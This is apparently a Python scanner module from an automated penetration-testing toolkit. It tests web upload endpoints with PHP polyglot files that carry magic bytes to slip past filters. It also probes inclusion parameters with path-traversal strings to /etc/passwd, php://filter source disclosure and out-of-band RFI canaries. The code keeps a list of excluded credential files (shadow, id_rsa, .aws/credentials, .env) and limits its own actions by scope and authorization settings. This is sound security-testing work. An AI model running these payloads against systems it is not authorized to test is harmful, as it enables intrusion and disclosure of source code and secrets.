#!/usr/bin/env python3
"""
run.py -- file-upload-path-traversal entry point.

Tests file-upload endpoints for MIME/magic-byte filter bypasses with BENIGN
canary polyglots, and file-inclusion sinks for LFI (path traversal / php filter)
and RFI (OOB-only). Detection + benign proof.

SAFETY MODEL (real RCE potential -- guardrails are load-bearing)
----------------------------------------------------------------
* Uploads use BENIGN canary polyglots only: each carries `<?php echo '<canary>';
  ?>` -- proving the filter was bypassed and (if the canary renders) that the
  file executed, with NO command exec / eval / file write / network code. Never
  a webshell.
* Uploads mutate the server, so they run ONLY when config.authorize_mutations is
  true (an explicit mutation budget); every upload is recorded in a cleanup
  ledger (meta.mutations) with its stored location.
* LFI reads BENIGN targets only (/etc/passwd, /etc/hostname, php://filter source
  disclosure) -- never /etc/shadow or credential/secret files. Read-only.
* RFI is OOB-only: a canary URL whose fetch is confirmed by callback. NO shell is
  ever served, so there is no remote code to execute.
* Scope-gated; uploaded content + LFI responses offloaded to the spill store.

CONTRACT
--------
* Input  : {"upload_endpoints": [{"url","field"}], "inclusion_sinks": [{"url","param"}],
            "oob_domain": "...", "target_base": "https://app",
            "scope_policy_spill_id": "...", "config": {...}}
* Output : one strict JSON artifact on stdout (references/ARTIFACT_SCHEMA.md).
"""
from __future__ import annotations

import asyncio
import base64
import json
import os
import re
import secrets
import sys
import time
from datetime import datetime, timezone
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import urljoin, urlsplit, urlunsplit, urlencode, parse_qsl

try:
    import httpx  # type: ignore
except ImportError:  # pragma: no cover
    httpx = None

try:
    from spill_store import read_spill, write_spill
except ImportError:  # pragma: no cover
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
    from spill_store import read_spill, write_spill  # type: ignore

HTTP_TIMEOUT = float(os.environ.get("UPL_HTTP_TIMEOUT", "20"))
OOB_WAIT = int(os.environ.get("UPL_OOB_WAIT", "15"))
_MANIFEST = os.environ.get(
    "UPL_POLYGLOTS",
    os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "assets", "polyglots", "manifest.json"))

# BENIGN LFI targets only. Credential/secret files are intentionally absent.
DEFAULT_LFI_TARGETS = ["/etc/passwd", "/etc/hostname"]
FORBIDDEN_LFI = ("shadow", "id_rsa", ".aws/credentials", ".ssh/", "htpasswd",
                 "web.config", "wp-config", ".env")
_PASSWD_SIG = re.compile(r"root:.*:0:0:")
_PHP_SRC_SIG = re.compile(r"<\?php|<\?=")


def _now_iso() -> str:
    return datetime.now(timezone.utc).isoformat()


def _host_of(url: str) -> str:
    try:
        return (urlsplit(url).hostname or "").lower()
    except ValueError:
        return ""


def _traversal_payloads(target: str) -> List[str]:
    t = target.lstrip("/")
    depth = "../" * 8
    return [
        f"{depth}{t}",
        f"/{depth}{t}",
        f"....//" * 8 + t,
        depth.replace("/", "%2f") + t,
        f"..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f{t}",
        f"/{t}",
    ]


class ScopePolicy:
    def __init__(self, policy: Optional[dict], hosts: List[str]):
        self.raw = policy or {}
        self.have_policy = policy is not None
        self.in_scope = [self._c(p) for p in self.raw.get("in_scope", [])]
        self.out_scope = [self._c(p) for p in self.raw.get("out_of_scope", [])]
        if not self.in_scope:
            for h in hosts:
                if h:
                    self.in_scope += [self._c(h), self._c(f"*.{h}")]

    @staticmethod
    def _c(pattern: str) -> re.Pattern:
        p = pattern.strip().lower().rstrip(".")
        if p.startswith("*."):
            return re.compile(rf"^([a-z0-9_-]+\.)*{re.escape(p[2:])}$")
        return re.compile(rf"^{re.escape(p)}$")

    def allowed(self, host: str) -> bool:
        h = (host or "").strip().lower()
        if not h:
            return False
        if any(rx.match(h) for rx in self.out_scope):
            return False
        return any(rx.match(h) for rx in self.in_scope)


class UploadLFITester:
    def __init__(self, upload_endpoints: List[dict], inclusion_sinks: List[dict],
                 oob_domain: Optional[str] = None, target_base: str = "",
                 scope_policy_spill_id: Optional[str] = None, config: Optional[dict] = None):
        self.uploads = upload_endpoints or []
        self.sinks = inclusion_sinks or []
        self.oob_domain = (oob_domain or "").strip() or None
        self.base = (target_base or "").strip()
        self.config = config or {}
        self.authorized = bool(self.config.get("authorize_mutations", False))
        self.errors: List[Dict[str, str]] = []
        self.mutations: List[dict] = []
        self.oob_canaries: Dict[str, dict] = {}
        try:
            with open(_MANIFEST, "r", encoding="utf-8") as fh:
                self.polyglots = json.load(fh).get("polyglots", [])
        except Exception as exc:  # noqa: BLE001
            self.errors.append({"stage": "polyglots", "error": str(exc)})
            self.polyglots = []
        hosts = [_host_of(self._abs(e.get("url", ""))) for e in self.uploads] + \
                [_host_of(self._abs(s.get("url", ""))) for s in self.sinks]
        policy = None
        if scope_policy_spill_id:
            try:
                policy = read_spill(scope_policy_spill_id)
            except Exception as exc:  # noqa: BLE001
                self.errors.append({"stage": "scope_load", "error": str(exc)})
        self.scope = ScopePolicy(policy, [h for h in hosts if h])

    def _abs(self, url: str) -> str:
        if url.startswith("http://") or url.startswith("https://"):
            return url
        return urljoin(self.base + ("/" if self.base and not self.base.endswith("/") else ""),
                       url.lstrip("/"))

    def _canary(self) -> str:
        return "UPL" + secrets.token_hex(5)

    def _build_polyglot(self, pg: dict, canary: str) -> bytes:
        magic = bytes.fromhex(pg.get("magic_hex", "")) if pg.get("magic_hex") else b""
        body = pg.get("template", "<?php echo '{CANARY}'; ?>").replace("{CANARY}", canary)
        return magic + body.encode("latin-1", "replace")

    # -- uploads ---------------------------------------------------------------
    async def test_polyglot_uploads(self, client, ep: dict) -> List[dict]:
        url = self._abs(ep.get("url", ""))
        if not self.scope.allowed(_host_of(url)):
            return []
        field = ep.get("field") or self.config.get("upload_field", "file")
        findings = []
        for pg in self.polyglots:
            canary = self._canary()
            content = self._build_polyglot(pg, canary)
            fname = pg.get("filename", "upload.bin")
            self.mutations.append({"action": "file_upload", "endpoint": url,
                                   "filename": fname, "polyglot": pg.get("name"),
                                   "benign_canary": canary, "at": _now_iso(),
                                   "note": "benign echo-canary file; remove during cleanup"})
            try:
                files = {field: (fname, content, pg.get("content_type", "application/octet-stream"))}
                r = await client.post(url, files=files)
                resp = r.text
            except Exception as exc:  # noqa: BLE001
                self.errors.append({"stage": "upload", "error": f"{fname}: {exc}"})
                continue
            # locate the stored file URL from the response
            stored = self._locate_uploaded(resp, fname)
            executed = False
            accessed = ""
            if stored:
                acc_url = self._abs(stored) if not stored.startswith("http") else stored
                try:
                    g = await client.get(acc_url)
                    accessed = acc_url
                    if canary in g.text:
                        executed = True   # canary rendered -> code executed (benign echo)
                except Exception:  # noqa: BLE001
                    pass
            if executed or (stored and self._filter_bypassed(fname)):
                findings.append({
                    "vuln_class": "malicious_upload", "endpoint": url,
                    "payload": f"{fname} ({pg.get('content_type')}, magic={pg.get('name')})",
                    "accessed_file": accessed or (stored or ""),
                    "confidence": "confirmed" if executed else "suspected",
                    "code_executed": executed,
                    "evidence_spill_id": write_spill({
                        "kind": "malicious_upload", "endpoint": url, "filename": fname,
                        "polyglot": pg.get("name"), "canary": canary, "executed": executed,
                        "stored_url": stored, "upload_response": resp[:4000],
                        "captured_at": _now_iso()}),
                })
        return findings

    @staticmethod
    def _filter_bypassed(fname: str) -> bool:
        low = fname.lower()
        return any(x in low for x in (".php", ".phtml", ".pht", ".php5", ".phar"))

    @staticmethod
    def _locate_uploaded(resp: str, fname: str) -> Optional[str]:
        # try JSON url/path fields, then any /uploads/... path, then the filename
        try:
            j = json.loads(resp)
            for k in ("url", "path", "location", "file", "filepath", "link"):
                if isinstance(j.get(k), str) and j[k]:
                    return j[k]
        except Exception:  # noqa: BLE001
            pass
        m = re.search(r"(/[\w./\-]*uploads?/[\w./\-]+)", resp)
        if m:
            return m.group(1)
        m = re.search(r"(https?://[\w./\-]+/" + re.escape(fname) + r")", resp)
        if m:
            return m.group(1)
        return None

    # -- LFI -------------------------------------------------------------------
    def _inject(self, url: str, param: str, value: str) -> str:
        parts = urlsplit(self._abs(url))
        q = dict(parse_qsl(parts.query, keep_blank_values=True))
        q[param] = value
        return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(q), parts.fragment))

    async def test_lfi_traversal(self, client, sink: dict) -> List[dict]:
        url = sink.get("url", "")
        param = sink.get("param", "page")
        if not self.scope.allowed(_host_of(self._abs(url))):
            return []
        findings = []
        targets = [t for t in (self.config.get("lfi_targets") or DEFAULT_LFI_TARGETS)
                   if not any(f in t for f in FORBIDDEN_LFI)]
        # path traversal to benign files
        for target in targets:
            for payload in _traversal_payloads(target):
                test_url = self._inject(url, param, payload)
                try:
                    r = await client.get(test_url)
                except Exception:  # noqa: BLE001
                    continue
                if _PASSWD_SIG.search(r.text) or (target.endswith("hostname") and
                                                  0 < len(r.text.strip()) < 64 and "\n" not in r.text.strip()):
                    findings.append(self._lfi_finding(url, payload, target, r.text))
                    break  # one working traversal per target is enough
        # php://filter source disclosure (benign: reads a source file as base64)
        for res in (self.config.get("lfi_php_targets") or []):
            payload = f"php://filter/convert.base64-encode/resource={res}"
            test_url = self._inject(url, param, payload)
            try:
                r = await client.get(test_url)
            except Exception:  # noqa: BLE001
                continue
            decoded = self._maybe_b64(r.text)
            if decoded and _PHP_SRC_SIG.search(decoded):
                findings.append(self._lfi_finding(url, payload, res, decoded[:4000]))
        return findings

    @staticmethod
    def _maybe_b64(text: str) -> Optional[str]:
        cand = re.search(r"[A-Za-z0-9+/]{40,}={0,2}", text or "")
        if not cand:
            return None
        try:
            return base64.b64decode(cand.group(0) + "===").decode("utf-8", "replace")
        except Exception:  # noqa: BLE001
            return None

    def _lfi_finding(self, url: str, payload: str, accessed: str, body: str) -> dict:
        return {
            "vuln_class": "LFI", "endpoint": self._abs(url), "payload": payload,
            "accessed_file": accessed, "confidence": "confirmed", "code_executed": False,
            "evidence_spill_id": write_spill({
                "kind": "LFI", "endpoint": self._abs(url), "payload": payload,
                "accessed_file": accessed, "response": body[:6000], "captured_at": _now_iso()}),
        }

    # -- RFI (OOB only, no shell served) ---------------------------------------
    async def test_rfi_oob(self, client, sink: dict) -> List[dict]:
        if not (self.oob_domain or self.config.get("oob_poll_url")):
            return []
        url = sink.get("url", "")
        param = sink.get("param", "page")
        if not self.scope.allowed(_host_of(self._abs(url))):
            return []
        canary = "rfi" + secrets.token_hex(6)
        if self.oob_domain:
            payload = f"http://{canary}.{self.oob_domain}/probe.txt"
        else:
            netloc = urlsplit(self.config.get("oob_poll_url", "")).netloc
            payload = f"http://{netloc}/{canary}"
        self.oob_canaries[canary] = {"sink": self._abs(url), "param": param}
        try:
            await client.get(self._inject(url, param, payload))
        except Exception:  # noqa: BLE001
            pass
        if any(canary in h for h in await self._poll_oob()):
            return [{
                "vuln_class": "RFI", "endpoint": self._abs(url), "payload": payload,
                "accessed_file": "", "confidence": "confirmed", "code_executed": False,
                "evidence_spill_id": write_spill({"kind": "RFI_oob", "canary": canary,
                                                  "payload": payload, "note": "no shell served; fetch confirmed via OOB",
                                                  "captured_at": _now_iso()})}]
        return []

    async def _poll_oob(self) -> List[str]:
        poll = self.config.get("oob_poll_url")
        if not poll or httpx is None:
            return []
        deadline = time.time() + OOB_WAIT
        collected: List[str] = []
        while time.time() < deadline:
            try:
                async with httpx.AsyncClient(timeout=HTTP_TIMEOUT) as c:
                    r = await c.get(poll)
                data = r.json()
                items = data.get("interactions", data) if isinstance(data, dict) else data
                collected = [it if isinstance(it, str) else json.dumps(it) for it in (items or [])]
                if any(cn in " ".join(collected) for cn in self.oob_canaries):
                    break
            except Exception:  # noqa: BLE001
                break
            await asyncio.sleep(3)
        return collected

    # -- orchestration ---------------------------------------------------------
    async def run(self) -> dict:
        started = time.time()
        if httpx is None:
            self.errors.append({"stage": "http", "error": "httpx not installed"})
            return self._artifact([], started, fatal=True)
        # Uploads mutate -> hard gate (LFI/RFI are read/fetch and run regardless)
        uploads_gated = bool(self.uploads) and not self.authorized
        if uploads_gated:
            self.errors.append({"stage": "authorization", "error":
                                "file uploads write to the target; set config.authorize_mutations=true "
                                "(mutation budget) to run them. Proceeding with LFI/RFI only."})
        findings: List[dict] = []
        try:
            async with httpx.AsyncClient(timeout=HTTP_TIMEOUT, follow_redirects=True) as client:
                if self.uploads and self.authorized:
                    for ep in self.uploads:
                        findings += await self.test_polyglot_uploads(client, ep)
                for sink in self.sinks:
                    findings += await self.test_lfi_traversal(client, sink)
                    findings += await self.test_rfi_oob(client, sink)
        except Exception as exc:  # noqa: BLE001
            self.errors.append({"stage": "run", "error": repr(exc)})
        return self._artifact(findings, started, gated=uploads_gated)

    def _artifact(self, findings: List[dict], started: float,
                  fatal: bool = False, gated: bool = False) -> dict:
        by = {}
        for f in findings:
            by[f["vuln_class"]] = by.get(f["vuln_class"], 0) + 1
        return {
            "findings": findings,
            "meta": {
                "skill": "file-upload-path-traversal", "version": "1.0", "phase": "5",
                "status": "error" if fatal else "ok",
                "uploads_authorization_required": gated,
                "generated_at": _now_iso(),
                "duration_seconds": round(time.time() - started, 2),
                "counts": by,
                "safety": {"uploads_authorized": self.authorized,
                           "webshell_payloads": False, "lfi_targets_benign": True,
                           "rfi_shell_served": False,
                           "forbidden_lfi_excluded": list(FORBIDDEN_LFI)},
                "mutations": self.mutations,
            },
            "scope_summary": {"policy_present": self.scope.have_policy},
            "errors": self.errors,
        }


# --- entry point -------------------------------------------------------------
def _load_input(argv: List[str]) -> dict:
    raw = ""
    if len(argv) > 1 and argv[1].strip():
        raw = argv[1]
    elif not sys.stdin.isatty():
        raw = sys.stdin.read()
    raw = raw.strip()
    if not raw:
        raise ValueError("no input: expected JSON {\"upload_endpoints\":[...],\"inclusion_sinks\":[...]}")
    obj = json.loads(raw)
    if not isinstance(obj, dict):
        raise ValueError("input must be a JSON object")
    return obj


def _error_artifact(message: str) -> dict:
    return {
        "findings": [],
        "meta": {"skill": "file-upload-path-traversal", "version": "1.0", "phase": "5",
                 "status": "error", "generated_at": _now_iso()},
        "errors": [{"stage": "init", "error": message}],
    }


async def _amain(argv: List[str]) -> int:
    try:
        payload = _load_input(argv)
    except Exception as exc:  # noqa: BLE001
        print(json.dumps(_error_artifact(f"input error: {exc}")))
        return 2
    uploads = payload.get("upload_endpoints") or []
    sinks = payload.get("inclusion_sinks") or []
    if not uploads and not sinks:
        print(json.dumps(_error_artifact("need 'upload_endpoints' and/or 'inclusion_sinks'")))
        return 2
    tester = UploadLFITester(
        upload_endpoints=uploads, inclusion_sinks=sinks,
        oob_domain=payload.get("oob_domain"), target_base=payload.get("target_base", ""),
        scope_policy_spill_id=payload.get("scope_policy_spill_id"), config=payload.get("config"))
    artifact = await tester.run()
    print(json.dumps(artifact, ensure_ascii=False))
    return 0


def main() -> int:
    return asyncio.run(_amain(sys.argv))


if __name__ == "__main__":
    raise SystemExit(main())
